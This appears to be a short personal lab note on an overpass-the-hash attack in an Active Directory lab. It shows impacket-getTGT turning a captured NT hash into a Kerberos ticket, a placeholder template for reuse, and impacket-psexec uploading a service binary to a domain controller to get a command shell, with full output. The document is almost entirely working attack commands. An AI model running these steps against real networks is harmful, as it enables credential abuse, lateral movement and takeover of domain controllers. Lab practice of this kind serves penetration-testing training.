

The use case scenario for this is when you have an accounts NTLM hash but its use of authorization is **restricted**, hence you come here

```
impacket-getTGT -dc-ip 192.168.176.129 -hashes :64f12cddaa88057e06a81b54e73b949b MARVEL.local/fcastle
impacket-getTGT -dc-ip <DC_IP> -hashes :<NT_HASH> <DOMAIN>.local/<USER>
```

```
export KRB5CCNAME=/home/kali/fcastle.ccache
```

```
impacket-psexec MARVEL.local/fcastle@HYDRA-DC -k -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on HYDRA-DC.....
[*] Found writable share ADMIN$
[*] Uploading file flwwXXKZ.exe
[*] Opening SVCManager on HYDRA-DC.....
[*] Creating service jeoL on HYDRA-DC.....
[*] Starting service jeoL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

# Lab

```
kali@kali ~> impacket-getTGT -dc-ip 192.168.176.129 -hashes :64f12cddaa88057e06a81b54e73b949b MARVEL.local/fcastle
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in fcastle.ccache
kali@kali ~> export KRB5CCNAME=fcastle.ccache
kali@kali ~> pwd
/home/kali
kali@kali ~> export KRB5CCNAME=/home/kali/fcastle.ccache
kali@kali ~> impacket-psexec MARVEL.local/fcastle@HYDRA-DC -k -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on HYDRA-DC.....
[*] Found writable share ADMIN$
[*] Uploading file flwwXXKZ.exe
[*] Opening SVCManager on HYDRA-DC.....
[*] Creating service jeoL on HYDRA-DC.....
[*] Starting service jeoL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```


## Extra

Might experiment with `SCShell`